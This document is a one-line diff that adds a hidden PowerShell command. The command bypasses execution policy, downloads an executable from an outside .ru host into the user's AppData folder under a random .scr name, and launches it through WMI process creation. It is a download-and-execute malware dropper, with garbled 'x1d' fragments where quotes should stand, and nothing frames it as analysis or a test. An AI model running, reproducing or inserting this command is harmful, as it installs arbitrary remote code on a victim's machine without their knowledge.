@@ -1,0 +1,1 @@
+PowerShell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -command Invoke-WebRequest -Uri 'http://www.kalodon.ru/upload/TT5B.exe' -OutFile x1d $env:APPDATAsdiofjhgsourephoei.scrx1d ;Invoke-WMIMethod -Class Win32_Process -Name Create -ArgumentList (x1d $env:APPDATAsdiofjhgsourephoei.scrx1d )
